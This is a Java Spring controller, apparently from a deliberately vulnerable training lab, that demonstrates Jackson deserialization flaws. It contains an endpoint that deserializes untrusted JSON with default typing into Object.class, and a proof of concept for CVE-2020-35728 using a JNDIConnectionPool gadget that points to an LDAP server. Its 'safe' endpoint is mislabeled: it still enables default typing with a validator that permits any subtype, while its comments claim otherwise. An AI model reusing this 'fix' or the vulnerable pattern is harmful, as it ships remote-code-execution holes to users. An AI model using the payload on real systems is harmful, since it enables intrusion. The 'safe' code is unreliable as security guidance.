package top.whgojp.modules.components.jackson.controller;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator;
import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

/**
 * @description 组件漏洞-Jackson
 * @author: whgojp
 * @email: whgojp@foxmail.com
 * @Date: 2024/8/12 22:50
 */
@Slf4j
@Api(value = "JacksonController", tags = "组件漏洞-Jackson")
@Controller
@CrossOrigin(origins = "*")
@RequestMapping("/jackson")
public class JacksonController {
    @RequestMapping("")
    public String jackson() {
        return "vul/components/jackson";
    }

    @PostMapping("/vul")
    @ResponseBody
    public String vulJackson(@RequestBody String content) {
        try {
            return new ObjectMapper()
                    .enableDefaultTyping()
                    .writeValueAsString(
                            new ObjectMapper().enableDefaultTyping().readValue(content, Object.class)
                    );
        } catch (Exception e) {
            return "Jackson RCE Error";
        }
    }


    @PostMapping("/safe")
    @ResponseBody
    public String safeJackson(@RequestBody String content) {
        try {
            // 使用安全的 ObjectMapper 配置
            ObjectMapper mapper = new ObjectMapper();
            // 禁用潜在的危险功能
            mapper.disableDefaultTyping();
            // 安全配置：只允许反序列化指定类型（如自定义的类或简单数据类型）
            mapper.activateDefaultTyping(
                    LaissezFaireSubTypeValidator.instance,
                    ObjectMapper.DefaultTyping.NON_FINAL
            );
            // 示例：仅允许特定的受信任类反序列化（可以根据需求自定义）
            mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);

            // 将 JSON 字符串安全地反序列化为指定的 POJO 类型
            Map<String, Object> safePayload = mapper.readValue(content, new TypeReference<Map<String, Object>>() {});
            return mapper.writeValueAsString(safePayload);
        } catch (Exception e) {
            e.printStackTrace();
            return "Jackson Safe Deserialization Error";
        }
    }



    /**
     * CVE-2020-35728
     * com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool组件库存在不安全的反序列化
     */
    public static void main(String[] args) throws Exception {
        String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/zrnug1\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }

}
